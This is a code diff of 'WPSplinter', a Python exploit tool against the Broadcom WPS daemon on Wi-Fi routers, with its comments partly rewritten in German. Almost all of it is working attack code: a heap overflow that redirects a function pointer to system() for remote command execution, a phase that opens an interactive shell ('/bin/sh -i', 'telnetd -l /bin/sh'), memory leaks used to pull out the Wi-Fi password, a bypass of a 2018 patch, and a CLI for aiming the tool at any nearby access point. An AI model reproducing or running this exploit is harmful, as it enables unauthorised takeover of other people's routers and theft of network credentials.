+    def phase_rce(self, cmd: bytes, system_plt=None) -> bool:
+        """
+        Code-Ausführung über send_data-Funktionszeiger-Überschreibung [1][2].
+
+        - cmd (nullterminiert) liegt am PUFERANFANG: last_sent zeigt
+          unverändert auf den Pufferstart; der Aufruf send_data(buf, len)
+        - wird zu system(cmd), da system zusätzliche Argumente ignoriert.
+        - Der 16-Bit-Integer-Underflow des 2018er Patches [2] erlaubt dem
+          wilden memcpy weiterhin, die State-Felder zu überschreiben.
+        """
+        if isinstance(cmd, str):
+            cmd = cmd.encode()
+        if not cmd.endswith(b"\x00"):
+            cmd += b"\x00"
+        plt = system_plt or self.system_plt
+        if not plt:
+            raise WpsError("RCE braucht --system_plt (firmware-spezifisch!)")
+        self.log(f"[*] Phase 4: RCE cmd={cmd!r} system@{plt:#x}")
+
+        if not self.assoc_ok and not self.associate():
+            return False
+        ident = self.start_wps()
+
+        ov = OverflowPayload()
+        ov.set_buffer_data(0, cmd)                            # Befehl vorn
+        ov.write_overflow(self.OFF_SEND_DATA,
+                          struct.pack(self.packfmt, plt))
+        payload = ov.build()
+
+        kind, ap = self.send_wsc(ident, WSC_FLAG_LF | WSC_FLAG_MF,
+                                 struct.pack(">H", len(payload) & 0xFFFF)
+                                 + payload[:1024])
+        if kind != "EAP" or not (ap.opcode in WSC_OP_FRAG_ACK_CANDIDATES):
+            self.log("[-] Erstes Fragment nicht bestätigt")
+            return False
+        rest = payload[1024:]
+        send_wsc_kwargs = dict(ident=ident)
+        frame = build_wsc_response(ident, WSC_FLAG_MF, rest)
+        self._tx(frame)
+        self.log("[*] Overflow übermittelt — warte auf Retransmit-Timer...")
+        time.sleep(6)          # Timer (ca. 5 s) triggert send_data-Callback
+        self.log("[+] RCE-Payload gesendet")
         return True
 
-    def _is_valid_hex_psk(self, candidate: bytes) -> bool:
-        """Check if bytes form a valid 64-character hex PSK."""
-        if len(candidate) != 64:
-            return False
-        try:
-            hex_str = candidate.decode('ascii')
-            bytes.fromhex(hex_str)
-            return True
-        except (ValueError, UnicodeDecodeError):
-            return False
+    def phase_shell(self):
+        return self.phase_rce(SHELL_CMD)
 
-    def phase_extract_psk(self, scan_size: int = 8192,
-                          base_offset: int = 0) -> list:
+    # ===================================================== Phase: M2D-Leak
+    def phase_m2d_leak(self) -> bytes:
         """
-        Extract WiFi PSK from router memory by leaking and scanning.
+        M2D-Zweit-Bug: Integer-Overread in der M2D-Antwort [2].
+        Wir senden eine gültige M1 und sammeln die M2/M2D-Daten aller
+        AP-Antworten — überzählige Bytes jenseits der deklarierten TLV-Länge
+        sind der Offenlegungs-Anteil.
         """
-        self._log("[*] Phase 3: PSK Extraction...")
+        self.log("[*] Phase: M2D-Overread...")
+        if not self.assoc_ok and not self.associate():
+            return b""
+        ident = self.start_wps()
+        m1 = build_wsc_m1(bytes.fromhex(self.sta.replace(":", "")))
+        self._tx(build_wsc_response(ident, 0, m1))
+        collected = b""
+        t_end = time.monotonic() + 6.0
+        while time.monotonic() < t_end:
+            try:
+                ap = self._rx(timeout=1.5)
+            except StationStateLost:
+                break
+            if ap is None:
+                break
+            if ap.opcode in (WSC_OP_M2, WSC_OP_M2D):
+                collected += ap.wsc_data
+                self.log(f"[+] M2/M2D empfangen ({len(ap.wsc_data)} B)")
+        return collected
 
-        all_psks = []
-
-        # Try different offsets in the heap
-        offsets = PSK_SCAN_OFFSETS
-        if base_offset:
-            offsets = [base_offset]
-
-        for offset in offsets:
-            self._log(f"[*] Leaking {scan_size} bytes from offset {offset:#x}...")
-            memory = self.phase_leak(target_offset=offset, leak_size=scan_size)
-
-            if memory and len(memory) > 0:
-                psks = self.scan_for_psk(memory)
-                all_psks.extend(psks)
-                if psks:
-                    self._log(f"[+] Found {len(psks)} PSK candidate(s) at offset {offset:#x}")
-
-        # Deduplicate
-        unique_psks = list(set(all_psks))
-
-        if unique_psks:
-            self._log(f"[+] Found {len(unique_psks)} unique PSK(s):")
-            for i, psk in enumerate(unique_psks, 1):
-                marker = " <-- MOST LIKELY" if i == 1 else ""
-                print(f"    [{i}] {psk.decode('utf-8', errors='replace')}{marker}")
-        else:
-            self._log("[-] No PSK candidates found")
-
-        return unique_psks
-
-    # =========================================================================
-    # Phase 4: Remote Code Execution
-    # =========================================================================
-
-    def phase_exploit(self, target_func: str = 'system',
-                      command: str = 'id',
-                      system_addr: int = None,
-                      send_data_offset: int = OFF_SEND_DATA) -> bool:
-        """
-        Execute arbitrary code on the target AP via heap buffer overflow.
-
-        The exploit overwrites the send_data function pointer to redirect
-        it to system() (or another chosen function), then triggers a
-        fragment re-send that causes the command to execute.
-        """
-        self._log(f"[*] Phase 4: RCE - executing '{command}' "
-                  f"via {target_func}...")
-
-        if not self.associated:
-            self.associate()
-
-        # Get target function address
-        if system_addr is None:
-            if self.arch == 'arm':
-                system_addr = DEFAULT_PLT['arm'].get(target_func,
-                                                     DEFAULT_PLT['arm']['system'])
-            else:
-                system_addr = DEFAULT_PLT['mips'].get(target_func,
-                                                      DEFAULT_PLT['mips']['system'])
-
-        self._log(f"[*] {target_func}@PLT = {system_addr:#010x}")
-
-        # Build command string
-        if isinstance(command, str):
-            cmd_bytes = command.encode() + b'\x00'
-        else:
-            cmd_bytes = command + b'\x00'
-
-        # Build the overflow payload
-        overflow = OverflowPayload()
-
-        # Place the command in the buffer (first 100 bytes or so)
-        # The AP will use this as the argument to system()
-        overflow.set_buffer_data(0, cmd_bytes)
-
-        # Overwrite send_data function pointer
-        fmt = '>I' if self.big_endian else '<I'
-        overflow.write_overflow(send_data_offset, struct.pack(fmt, system_addr))
-
-        # Also set flags to trigger the callback
-        overflow.write_overflow(OFF_FLAGS, struct.pack(fmt, 0x00000001))
-
-        payload = overflow.build()
-
-        # Send EAPOL-Start and Identity Response first
-        self.eap_id = 0
-        self.tx_eapol_start()
-        time.sleep(0.3)
-        self.tx_eap_identity_response()
-        time.sleep(0.5)
-
-        # Send M1 with the overflow payload
-        # The overflow payload contains:
-        # - Command string in the beginning of the buffer
-        # - Overwritten function pointers past the buffer end
-        self.tx_wsc_message(
-            opcode=WPS_OP_M1,
-            flags=WSC_FLAG_MF | WSC_FLAG_LF,
-            data=payload,
-            lf_total=len(payload)
-        )
-
-        # Wait for Fragment-Ack
-        frag_ack = self.wait_for_frag_ack(timeout=3.0)
-        if frag_ack:
-            self._log("[+] FRAG-ACK received - overflow accepted")
-
-            # Send completion fragment (empty, flags=0)
-            # This triggers the re-send path which calls send_data()
-            # with our command as the argument
-            self.tx_wsc_message(opcode=WPS_OP_M1, flags=0, data=b'')
-            self._log("[+] Completion fragment sent - triggering code execution")
-
-            # Wait for timer to expire and trigger re-send (if applicable)
-            self._log("[i] Waiting 5s for timer to trigger...")
-            time.sleep(5)
-
-            self._log("[+] Exploit sent!")
-            return True
-        else:
-            self._log("[-] No FRAG-ACK for exploit payload", 'error')
-            return False
-
-    # =========================================================================
-    # Phase: 2018 Patch Bypass
-    # =========================================================================
-
+    # ================================================= Phase: 2018-Bypass
     def phase_bypass_2018(self) -> bool:
         """
-        Bypass the 2018 Broadcom patch.
-
-        The 2018 patch added a bounds check but can be bypassed
-        by setting total_bytes_to_recv to a specific value (0xFFFF)
-        that causes an integer truncation in the check.
+        Umgehung des stillen 2018er Patches: die hinzugefügten Bounds-Checks
+        erlauben weiterhin einen Integer-Underflow bis zum memcpy [2].
+        Wir deklarieren die Gesamtlänge als 0xFFFF (16-Bit-Längefeld),
+        sodass die Prüfung (capacity - used) unterläuft.
         """
-        self._log("[*] Phase: 2018 patch bypass...")
-
-        if not self.associated:
-            self.associate()
-
-        self.eap_id = 0
-        self.tx_eapol_start()
-        time.sleep(0.3)
-        self.tx_eap_identity_response()
-        time.sleep(0.5)
-
-        # Set total_bytes_to_recv to bypass the bounds check
-        fmt = '>I' if self.big_endian else '<I'
-        overflow = OverflowPayload()
-
-        # Write 0xFFFFFFFF or specific bypass value
-        valve = 0xFFFFFFFF if self.big_endian else 0xFFFFFFFF
-        overflow.write_overflow(OFF_TOTAL_BYTES, struct.pack(fmt, valve))
-        overflow.write_overflow(OFF_FLAGS, struct.pack(fmt, 0x00000002))
-
-        payload = overflow.build()
-
-        self.tx_wsc_message(
-            opcode=WPS_OP_M1,
-            flags=WSC_FLAG_MF | WSC_FLAG_LF,
-            data=payload,
-            lf_total=len(payload)
-        )
-
-        if self.wait_for_frag_ack(timeout=3.0):
-            self._log("[+] 2018 bypass payload sent successfully")
-            return True
-        else:
-            self._log("[-] 2018 bypass failed", 'error')
+        self.log("[*] Phase: 2018-Patch-Bypass (Integer-Underflow) [2]...")
+        if not self.assoc_ok and not self.associate():
             return False
+        ident = self.start_wps()
+        data = struct.pack(">H", 0xFFFF) + b"\x41" * 512
+        kind, ap = self.send_wsc(ident, WSC_FLAG_LF | WSC_FLAG_MF, data)
+        if kind == "EAP" and ap.opcode in WSC_OP_FRAG_ACK_CANDIDATES:
+            self.log("[+] FRAG-ACK auf total=0xFFFF — Patch-Bypass aktiv")
+            return True
+        self.log("[-] Kein FRAG-ACK — evtl. voll gepatcht oder hostapd")
+        return False
 
-    # =========================================================================
-    # Phase: M2D Integer Overread
-    # =========================================================================
-
-    def phase_m2d_leak(self, leak_addr: int = 0) -> bytes:
-        """
-        Trigger M2D integer overread to leak heap memory.
-
-        The M2D response contains an integer overread that can be
-        leveraged to leak adjacent heap contents in the response.
-        """
-        self._log("[*] Phase: M2D integer overread leak...")
-
-        if not self.associated:
-            self.associate()
-
-        self.eap_id = 0
-        self.tx_eapol_start()
-        time.sleep(0.3)
-        self.tx_eap_identity_response()
-        time.sleep(0.5)
-
-        # Send M1 to initiate WPS
-        m1_data = build_wsc_m1(bytes.fromhex(self.sta_mac))
-        self.tx_wsc_message(opcode=WPS_OP_M1, flags=0, data=m1_data)
-
-        # Wait for M2 or M2D response
-        time.sleep(2.0)
-        responses = self.wait_for_response(timeout=5.0)
-
-        # Parse responses for M2D
-        leaked = b''
-        for pkt in responses:
-            if Raw in pkt:
-                raw = bytes(pkt[Raw].load)
-                # Check for M2D opcode (0x06)
-                if len(raw) >= 15 and raw[14] == WPS_OP_M2D:
-                    # Extract data past the expected M2D length
-                    # This is where the overread leak occurs
-                    m2d_data = raw[15:]  # After opcode and flags
-                    if len(m2d_data) > 0:
-                        leaked = m2d_data
-                        self._log(f"[+] M2D received, leaked {len(leaked)} bytes")
-
-        return leaked
-
-    # =========================================================================
-    # Utility Functions
-    # =========================================================================
-
-    def capture_pcap(self, output_path: str):
-        """Save captured packets to PCAP file."""
-        if self.captured_packets:
-            wrpcap(output_path, self.captured_packets)
-            self._log(f"[+] Saved {len(self.captured_packets)} packets to {output_path}")
-        else:
-            self._log("[i] No packets captured")
-
-    def sanitize_pcap(self, input_pcap: str, output_pcap: str):
-        """Sanitize a PCAP by removing sensitive information."""
-        from scapy.all import rdpcap
-        pkts = rdpcap(input_pcap)
-        sanitized = []
-        for pkt in pkts:
-            if Raw in pkt:
-                raw = pkt[Raw].load
-                # Replace SSID
-                raw = raw.replace(self.ssid, b'SANITIZED')
-                pkt[Raw].load = raw
-            sanitized.append(pkt)
-        wrpcap(output_pcap, sanitized)
-        self._log(f"[+] Sanitized PCAP saved to {output_pcap}")
+    # ------------------------------------------------------------ Utilities
+    def hexdump(self, data, width=16):
+        for off in range(0, len(data), width):
+            chunk = data[off:off + width]
+            hexs = " ".join(f"{b:02x}" for b in chunk)
+            txt = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
+            print(f"  {off:08x}  {hexs:<{width*3}}  {txt}")
 
     def close(self):
-        """Cleanup resources."""
-        self._log("[*] Cleaning up...")
+        if self.dump and self.packets:
+            wrpcap(self.dump, self.packets)
+            logger.info(f"[+] {len(self.packets)} Pakete -> {self.dump}")
+
+
+class StationStateLost(Exception):
+    def __init__(self, action, reason):
+        super().__init__(f"station state lost: {action} reason={reason}")
+        self.action, self.reason = action, reason
+
+
+class WpsError(Exception):
+    pass
 
 
 # =============================================================================
-# Main Entry Point
+# CLI
 # =============================================================================
 
 def main():
-    parser = argparse.ArgumentParser(
-        description="WPSplinter v7 - Broadcom WPS Monitor Exploit (CVE-2026-8412)",
+    ap = argparse.ArgumentParser(
+        description="WPSplinter v8 — Broadcom WPS Monitor Exploit",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
-Examples:
-  # Fingerprint target AP
-  %(prog)s --iface wlan0mon --bssid AA:BB:CC:DD:EE:FF --ssid MyNetwork --phase fingerprint
+Phasen:
+  fingerprint     Nicht-invasiver Zero-Length-Differenzial-Fingerprint [10]
+  vuln_probe      Oversize-total-Probe (FRAG-ACK => Reassembly verwundbar)
+  leak            last_sent_len-Overflow -> Memory Disclosure
+  extract_psk     Heap nach PSK durchsuchen
+  m2d_leak        M2D-Integer-Overread [2]
+  bypass_2018     Integer-Underflow gegen den 2018er Patch [2]
+  rce             send_data = system@plt (benötigt --system_plt!)
+  shell           RCE mit /bin/sh -i
 
-  # Extract WiFi PSK
-  %(prog)s --iface wlan0mon --bssid AA:BB:CC:DD:EE:FF --ssid MyNetwork --phase extract_psk
+Hinweis: Es existiert KEIN CVE für diese Schwachstelle [1].
+""")
+    ap.add_argument("--iface", required=True)
+    ap.add_argument("--bssid", required=True)
+    ap.add_argument("--ssid", required=True)
+    ap.add_argument("--channel", type=int)
+    ap.add_argument("--phase", required=True,
+                    choices=["fingerprint", "vuln_probe", "leak",
+                             "extract_psk", "m2d_leak", "bypass_2018",
+                             "rce", "shell"])
+    ap.add_argument("--profile", choices=sorted(DEVICE_PROFILES),
+                    help="Geräteprofil (setzt arch/endianness-Vorgaben)")
+    ap.add_argument("--arch", choices=["arm", "mips"], default=None)
+    ap.add_argument("--system_plt", type=lambda x: int(x, 0), default=None,
+                   help="system@PLT (hex) — für rce/shelL zwingend")
+    ap.add_argument("--cmd", default="id;#")
+    ap.add_argument("--off_total_bytes", type=lambda x: int(x, 0),
+                    default=OFF_TOTAL_BYTES)
+    ap.add_argument("--off_last_sent_len", type=lambda x: int(x, 0),
+                    default=OFF_LAST_SENT_LEN)
+    ap.add_argument("--off_send_data", type=lambda x: int(x, 0),
+                    default=OFF_SEND_DATA)
+    ap.add_argument("--psk_offset", type=lambda x: int(x, 0), default=0)
+    ap.add_argument("--psk_size", type=int, default=4096)
+    ap.add_argument("--leak_size", type=int, default=1024)
+    ap.add_argument("--dump", default=None)
+    ap.add_argument("-v", "--verbose", action="store_true")
+    ap.add_argument("-d", "--debug", action="store_true")
+    args = ap.parse_args()
 
-  # Execute command
-  %(prog)s --iface wlan0mon --bssid AA:BB:CC:DD:EE:FF --ssid MyNetwork --phase rce --cmd "id"
+    arch, big_endian, plt_default, _note = (
+        DEVICE_PROFILES.get(args.profile, ("arm", "little", None, "")))
+    if args.arch:
+        arch = args.arch
+        big_endian = (arch == "mips")
+    if not args.profile and not args.arch:
+        arch, big_endian = "arm", False
 
-  # Execute with custom system@PLT
-  %(prog)s --iface wlan0mon --bssid AA:BB:CC:DD:EE:FF --ssid MyNetwork --phase rce \\
-      --system_plt 0x211d0 --cmd "telnetd -l /bin/sh"
-        """
-    )
+    w = WPSplinter(
+        interface=args.iface, bssid=args.bssid, ssid=args.ssid,
+        channel=args.channel, arch=arch, big_endian=big_endian,
+        system_plt=args.system_plt or plt_default,
+        off_total_bytes=args.off_total_bytes,
+        off_last_sent_len=args.off_last_sent_len,
+        off_send_data=args.off_send_data,
+        dump=args.dump, verbose=args.verbose, debug=args.debug)
 
-    # Required arguments
-    parser.add_argument("--iface", required=True,
-                        help="Monitor-mode WiFi interface")
-    parser.add_argument("--bssid", required=True,
-                        help="Target AP BSSID (MAC address)")
-    parser.add_argument("--ssid", required=True,
-                        help="Target network SSID")
-    parser.add_argument("--phase", required=True, default=None,
-                        choices=["fingerprint", "fingerprint_deep",
-                                 "leak", "extract_psk", "rce", "bypass_2018",
-                                 "m2d_leak", "shell"],
-                        help="Exploit phase to execute")
-
-    # Optional arguments
-    parser.add_argument("--channel", type=int, default=None,
-                        help="WiFi channel number")
-    parser.add_argument("--arch", choices=["arm", "mips"], default="arm",
-                        help="Target architecture")
-    parser.add_argument("--system_plt", type=lambda x: int(x, 0), default=None,
-                        help="system@PLT address (hex)")
-    parser.add_argument("--cmd", type=str, default="id",
-                        help="Command to execute (for RCE phase)")
-    parser.add_argument("--send_data_off", type=lambda x: int(x, 0),
-                        default=OFF_SEND_DATA,
-                        help="send_data offset in state struct")
-    parser.add_argument("--psk_offset", type=lambda x: int(x, 0), default=0,
-                        help="Base memory offset for PSK scan")
-    parser.add_argument("--psk_size", type=int, default=8192,
-                        help="Number of bytes to scan for PSK")
-    parser.add_argument("--leak_size", type=int, default=1024,
-                        help="Number of bytes to leak")
-    parser.add_argument("--dump", type=str, default=None,
-                        help="Output PCAP file for captured packets")
-    parser.add_argument("--target_func", type=str, default="system",
-                        choices=["system", "sprintf", "printf", "snprintf"],
-                        help="Target function for RCE")
-
-    # Verbose/debug flags
-    parser.add_argument("-v", "--verbose", action="store_true",
-                        help="Verbose output")
-    parser.add_argument("-d", "--debug", action="store_true",
-                        help="Debug output")
-
-    args = parser.parse_args()
-
-    # Validate arguments
-    if args.phase in ("rce", "shell") and not args.system_plt and args.target_func == "system":
-        # Use default if possible
-        if args.arch == "arm":
-            args.system_plt = DEFAULT_PLT['arm']['system']
-            logger.info(f"[*] Using default system@PLT: {args.system_plt:#x}")
-        else:
-            print("[!] WARNING: Using default MIPS system address - "
-                  "this is firmware-specific!")
-            if not any('mips' in DEFAULT_PLT for _ in [1]):
-                print("[!] MIPS defaults not reliable - specify --system_plt")
-                sys.exit(1)
-
-    # Create exploit instance
-    wps = WPSplinter(
-        interface=args.iface,
-        bssid=args.bssid,
-        ssid=args.ssid,
-        channel=args.channel,
-        arch=args.arch,
-        verbose=args.verbose,
-        debug=args.debug
-    )
-
-    # Set channel if specified
-    if args.channel:
-        wps.set_channel(args.channel)
-
-    # Execute requested phase
-    result = None
+    rc = 2
     try:
         if args.phase == "fingerprint":
-            result = wps.phase_fingerprint()
-
-        elif args.phase == "fingerprint_deep":
-            result = wps.phase_fingerprint_deeper()
-
+            rc = 0 if w.phase_fingerprint() else 1
+        elif args.phase == "vuln_probe":
+            rc = 0 if w.phase_vuln_probe() else 1
         elif args.phase == "leak":
-            data = wps.phase_leak(
-                target_offset=args.psk_offset,
-                leak_size=args.leak_size
-            )
+            data = w.phase_leak(leak_size=args.leak_size)
             if data:
-                print(f"[leak] {data.hex()}")
-            result = bool(data)
-
+                w.hexdump(data)
+            rc = 0 if data else 1
         elif args.phase == "extract_psk":
-            psks = wps.phase_extract_psk(
-                scan_size=args.psk_size,
-                base_offset=args.psk_offset
-            )
-            result = len(psks) > 0
-
-        elif args.phase == "rce":
-            result = wps.phase_exploit(
-                target_func=args.target_func,
-                command=args.cmd,
-                system_addr=args.system_plt,
-                send_data_offset=args.send_data_off
-            )
-
-        elif args.phase == "bypass_2018":
-            result = wps.phase_bypass_2018()
-
+            psks = w.phase_extract_psk(scan_size=args.psk_size,
+                                      base_offset=args.psk_offset)
+            rc = 0 if psks else 1
         elif args.phase == "m2d_leak":
-            data = wps.phase_m2d_leak()
+            data = w.phase_m2d_leak()
             if data:
-                print(f"[m2d_leak] {data.hex()}")
-            result = bool(data)
-
+                w.hexdump(data)
+            rc = 0 if data else 1
+        elif args.phase == "bypass_2018":
+            rc = 0 if w.phase_bypass_2018() else 1
+        elif args.phase == "rce":
+            rc = 0 if w.phase_rce(args.cmd) else 1
         elif args.phase == "shell":
-            result = wps.phase_exploit(
-                target_func='system',
-                command='/bin/sh -i',
-                system_addr=args.system_plt,
-                send_data_offset=args.send_data_off
-            )
-
+            rc = 0 if w.phase_shell() else 1
     except KeyboardInterrupt:
-        print("\n[!] Interrupted by user")
-    except Exception as e:
-        print(f"[!] Error: {e}")
-        if args.debug:
-            import traceback
-            traceback.print_exc()
+        print("\n[!] Abbruch durch Benutzer")
+        rc = 130
+    except (WpsError, StationStateLost) as e:
+        print(f"[!] {e}")
+        rc = 2
     finally:
-        # Save PCAP if requested
-        if args.dump:
-            wps.capture_pcap(args.dump)
-        wps.close()
-
-    if result:
-        print("[+] Phase completed successfully")
-    else:
-        print("[-] Phase did not complete successfully (or no result)")
-
-    return 0 if result else 1
+        w.close()
+    sys.exit(rc)
 
 
 if __name__ == "__main__":
-    sys.exit(main())
+    main()
